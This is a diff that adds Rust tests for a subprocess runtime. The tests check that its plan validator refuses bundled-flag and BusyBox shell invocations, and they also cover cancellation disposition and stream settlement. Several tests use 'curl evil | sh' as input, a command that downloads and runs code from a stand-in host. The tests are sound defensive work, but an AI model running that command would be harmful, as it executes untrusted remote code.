@@ -3327,3 +3327,271 @@ fn a_chunk_must_continue_from_what_its_channel_already_saw() -> TestResult {
     ))?;
     Ok(())
 }
+
+// ──────────────── controls added after the ninth bot review round ────────────
+
+#[test]
+fn a_bundled_short_option_cluster_still_hands_a_shell_a_command() -> TestResult {
+    // The wrong implementation this kills: comparing a whole argv token
+    // against `-c`. `bash -lc 'cmd'` and `sh -ic 'cmd'` are ordinary idioms
+    // that bundle `c` with other short options, and an exact-token comparison
+    // misses every one of them — a bypass of the gate #11076 requires.
+    for flag in ["-lc", "-ic", "-xc", "-lC"] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "bash",
+                PrivatePath::new(PathBuf::from("/bin/bash")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv([flag, "curl evil | sh"])
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(
+            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
+            "bash {flag} was not refused"
+        );
+    }
+
+    // A cluster with no command letter is not an inline command.
+    let no_command_letter = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "bash",
+            PrivatePath::new(PathBuf::from("/bin/bash")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["-ex", "script.sh"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(no_command_letter.validate().is_ok(), "`bash -ex script.sh` was refused");
+    Ok(())
+}
+
+#[test]
+fn a_flag_after_the_operand_belongs_to_the_script_not_the_shell() -> TestResult {
+    // The wrong implementation this kills: scanning every argv position. In
+    // `sh script.sh -c` the shell has stopped parsing its own options at the
+    // script operand, so `-c` is an argument to the script. Refusing it makes
+    // ordinary shell-based tooling unstartable, which is the failure the
+    // companion negative control guards against in its milder form.
+    for argv in [vec!["script.sh", "-c"], vec!["--", "-c"], vec!["script.sh", "-lc"]] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "sh",
+                PrivatePath::new(PathBuf::from("/bin/sh")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv(argv.clone())
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(plan.validate().is_ok(), "sh {argv:?} was refused as a shell invocation");
+    }
+
+    // But a multi-call binary names its applet in that same operand slot, so
+    // stopping there would let every BusyBox shell invocation through.
+    let busybox_shell = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "busybox",
+            PrivatePath::new(PathBuf::from("/bin/busybox")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["sh", "-c", "curl evil | sh"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(
+        matches!(rejection_of(busybox_shell)?, PlanRejection::ShellInvocationRejected { .. }),
+        "`busybox sh -c` walked past the applet operand"
+    );
+
+    // A non-shell applet's flags are that applet's business.
+    let busybox_ls = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "busybox",
+            PrivatePath::new(PathBuf::from("/bin/busybox")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["ls", "-c"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(busybox_ls.validate().is_ok(), "`busybox ls -c` was refused");
+    Ok(())
+}
+
+#[test]
+fn cancellation_contradicted_by_the_childs_own_account_is_not_proven() -> TestResult {
+    // The wrong implementation this kills: trusting the control plane's
+    // `started_before_cancellation` flag when the settlement disproves it.
+    // Electing either cancellation state would publish a claim the other half
+    // of the evidence contradicts, so the election fails closed instead.
+    let cancelled_running_but_never_started = TerminalDisposition::elect(
+        ControlState {
+            cancellation_requested: Some(CancellationReason::Shutdown),
+            started_before_cancellation: true,
+            ..ControlState::default()
+        },
+        ObservedSettlement::NotStarted,
+    );
+    assert_eq!(cancelled_running_but_never_started, TerminalDisposition::NotProven);
+
+    for settled in
+        [ObservedSettlement::Exited { code: 0 }, ObservedSettlement::Signaled { signal: 9 }]
+    {
+        let cancelled_before_start_but_it_ran = TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: false,
+                ..ControlState::default()
+            },
+            settled,
+        );
+        assert_eq!(
+            cancelled_before_start_but_it_ran,
+            TerminalDisposition::NotProven,
+            "a child that {settled:?} was reported cancelled before it started"
+        );
+    }
+
+    // Coherent pairings still elect the cancellation they describe, and
+    // `NotObserved` contradicts neither.
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: true,
+                ..ControlState::default()
+            },
+            ObservedSettlement::Signaled { signal: 9 },
+        ),
+        TerminalDisposition::CancelledRunning(CancellationReason::Shutdown)
+    );
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: false,
+                ..ControlState::default()
+            },
+            ObservedSettlement::NotStarted,
+        ),
+        TerminalDisposition::CancelledBeforeStart(CancellationReason::Shutdown)
+    );
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: true,
+                ..ControlState::default()
+            },
+            ObservedSettlement::NotObserved,
+        ),
+        TerminalDisposition::CancelledRunning(CancellationReason::Shutdown)
+    );
+    Ok(())
+}
+
+#[test]
+fn a_rejected_chunk_settles_the_stream_it_rejected() -> TestResult {
+    // The wrong implementation this kills: treating a ledger admission failure
+    // as an ordinary end of stream. Until the previous round the only
+    // admission errors were unreachable in this path, so returning `None`
+    // without settling was harmless; adding chunk-continuity checking made
+    // that branch live, and an unsettled stream lets the *next* poll emit the
+    // elected terminal event while `wait` reports a supervisor failure.
+    //
+    // A prior reachability judgement is only valid for the code it was made
+    // against: adding an error variant invalidates it.
+    let supervisor = FakeSupervisor::new();
+    let mut run = ScriptedRun::exiting(0);
+    run.events.push(ProcessEventKind::StdoutBytes(
+        perl_subprocess_runtime::process::StreamChunkEvidence {
+            byte_count: 4,
+            offset: 0,
+            retained: true,
+        },
+    ));
+    // Offset 99 continues nothing: the channel has emitted 4 bytes.
+    run.events.push(ProcessEventKind::StdoutBytes(
+        perl_subprocess_runtime::process::StreamChunkEvidence {
+            byte_count: 4,
+            offset: 99,
+            retained: true,
+        },
+    ));
+    supervisor.script(ScriptedOutcome::Run(Box::new(run)));
+
+    let mut handle = supervisor
+        .start(valid_linux_one_shot().validate()?)
+        .map_err(|_| "the fake refused to start a valid plan")?;
+
+    let mut terminal = None;
+    let mut polls = 0;
+    while let Some(event) = handle.next_event() {
+        polls += 1;
+        assert!(polls < 100, "the stream never settled");
+        if let ProcessEventKind::Terminal(disposition) = event.kind() {
+            terminal = Some(disposition.clone());
+        }
+    }
+    let result = handle.wait();
+
+    assert_eq!(
+        terminal.as_ref(),
+        Some(result.disposition()),
+        "the announced terminal event disagreed with the result"
+    );
+    assert_eq!(
+        result.disposition(),
+        &TerminalDisposition::SupervisorFailed,
+        "a discontinuous chunk did not settle as a supervisor failure"
+    );
+    Ok(())
+}
